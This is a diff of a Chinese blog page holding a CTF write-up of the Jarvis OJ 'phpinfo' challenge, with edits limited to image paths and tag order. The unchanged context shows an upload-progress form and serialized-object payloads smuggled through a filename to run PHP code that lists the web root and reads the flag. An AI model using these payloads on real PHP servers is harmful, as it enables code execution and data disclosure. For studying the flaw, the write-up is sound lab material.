@@ -188,7 +188,7 @@
 <a id="more"></a>
 
 <hr>
-<p><img src="picture1.jpg" alt="image"></p>
+<p><img src="/2018/10/03/PHPsession/picture1.jpg" alt="image"></p>
 <p>php只是比php_serialize序列化多出了一个键名 ＋ 竖线 ，键名可以是空的，可以注入。  </p>
 <h4 id="Jarvis-OJ-phpinfo"><a href="#Jarvis-OJ-phpinfo" class="headerlink" title="Jarvis OJ phpinfo"></a>Jarvis OJ phpinfo</h4><blockquote>
 <p>看这道jarvios oj 的题：</p>
@@ -201,11 +201,11 @@
 <p>得到结果：O:5:”OowoO”:1:{s:4:”mdzz”;s:14:”echo “hacker”;”;}<br>注意这里不能把这个直接传过去，利用解析引擎不同 要在前面加个| （引号要转义）<br>也就是说 传进去的filename:|O:5:\“OowoO\“:1:{s:4:\“mdzz\“;s:14:\“echo \“hacker\“;\“;}</p>
 <p>新建一个html:</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>上传文件burp抓包,把filename改为上面的payload：<br><img src="picture2.jpg" alt="image"><br>执行成功  </p>
+<p>上传文件burp抓包,把filename改为上面的payload：<br><img src="/2018/10/03/PHPsession/picture2.jpg" alt="image"><br>执行成功  </p>
 <p>看一下根目录：<br>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:35:&quot;print_r($_SERVER[&quot;DOCUMENT_ROOT&quot;]);&quot;;}  </p>
-<p><img src="picture3.jpg" alt="image"></p>
+<p><img src="/2018/10/03/PHPsession/picture3.jpg" alt="image"></p>
 <p>进去看看有什么：<br>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:39:&quot;print_r(scandir(‘/opt/lampp/htdocs/‘));&quot;;}  </p>
-<p><img src="picture4.jpg" alt="image"><br>  读flag:<br><img src="picture5.jpg" alt="image"></p>
+<p><img src="/2018/10/03/PHPsession/picture4.jpg" alt="image"><br>  读flag:<br><img src="/2018/10/03/PHPsession/picture5.jpg" alt="image"></p>
 <p>参考:  <br><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>
 <p><a href="https://blog.csdn.net/qq_35078631/article/details/77284684" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/77284684</a></p>
 
@@ -534,11 +534,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Crypto</a>
+                <a href="javascript:void(0)" class="js-tag color4">Web</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Web</a>
+                <a href="javascript:void(0)" class="js-tag color2">Crypto</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -550,15 +550,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">Datacon</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">PHP</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">线下</a>
+                <a href="javascript:void(0)" class="js-tag color5">解决方法</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">解决方法</a>
+                <a href="javascript:void(0)" class="js-tag color3">线下</a>
               </li>
             
             <div class="clearfix"></div>
